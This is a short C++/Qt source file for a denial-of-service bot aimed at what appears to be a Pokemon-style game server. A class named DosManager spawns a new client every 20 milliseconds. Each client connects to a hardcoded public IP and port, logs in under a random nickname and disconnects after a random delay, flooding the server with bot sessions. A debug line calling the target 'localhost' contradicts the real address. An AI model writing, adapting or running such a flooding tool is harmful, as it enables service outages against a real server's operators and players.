#include "arg.h"

DosManager::DosManager()
{
    t.start(20,this);
}

void DosManager::timerEvent(QTimerEvent *)
{
    IOManager *m = new IOManager();
    connect(m, SIGNAL(disconnected()), SLOT(removeStuff()));
    bots.insert(m);
    qDebug() << "added , " << bots.size();
}

void DosManager::removeStuff()
{
    qDebug() << "removing, " << bots.size();
    ((IOManager*)sender())->deleteLater();
    bots.remove((IOManager*)sender());
    qDebug() << "removed, " << bots.size();
}

IOManager::IOManager()
{
    qDebug() << "Connecting to localhost";

    connect(&a, SIGNAL(connected()), SLOT(connectionEstablished()));
    connect(&a, SIGNAL(disconnected()), SLOT(goodToDelete()));
    on = true;
    a.connectTo("68.32.58.76", 5080);
}

void IOManager::goodToDelete()
{
    qDebug() << "Disconnected";
    emit disconnected();
    on = false;
}

void IOManager::connectionEstablished()
{
    qDebug() << "Connection established";

    TrainerTeam t;

    QString nick;
    for (int i = 0; i < 1; i++) {
        nick.append( char(( (rand()+clock()) %2) ? 'A' + ((rand()+clock()) % 26) : 'a' + ( (rand()+clock()) % 26)));
    }

    t.setTrainerNick(nick);

    FullInfo f = {t, true,true,Qt::black};

    a.login(f);

    this->t.start((rand()%10 + 1)*200,this);
}

void IOManager::timerEvent(QTimerEvent *)
{
    emit disconnected();
}
